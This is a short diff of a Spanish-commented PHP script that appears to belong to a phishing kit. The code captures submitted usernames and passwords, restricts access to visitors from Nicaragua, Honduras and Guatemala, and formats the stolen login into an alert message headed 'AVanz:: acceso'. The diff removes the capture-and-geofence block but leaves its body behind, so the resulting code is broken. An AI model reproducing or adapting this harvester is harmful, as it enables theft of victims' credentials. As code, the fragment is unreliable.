@@ -16,19 +16,7 @@ function obtenerPais($ip) {
     return "XX"; // Si hay un error en la API, devuelve "XX" por defecto
 }
 
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $usuario = isset($_POST['pp1']) ? htmlspecialchars($_POST['pp1']) : '';
-    $contrasena = isset($_POST['pp2']) ? htmlspecialchars($_POST['pp2']) : '';
-    $ip = $_SERVER['REMOTE_ADDR'];
-
-    // Verificar si la IP pertenece a los países permitidos
-    $pais = obtenerPais($ip);
-    $paisesPermitidos = ["NI", "HN", "GT"]; // Nicaragua, Honduras, Guatemala
-
-    if (!in_array($pais, $paisesPermitidos)) {
-        file_put_contents("bloqueados.log", "IP Bloqueada: $ip - País: $pais\n", FILE_APPEND); // Guarda en un log
-        die("Acceso denegado"); // Bloquea el acceso si no está en la lista de países permitidos
-    }
+ 
 
     $mensaje = "🛑 AVanz:: acceso 🛑\n\n";
     $mensaje .= "👤 Usuario: $usuario\n";
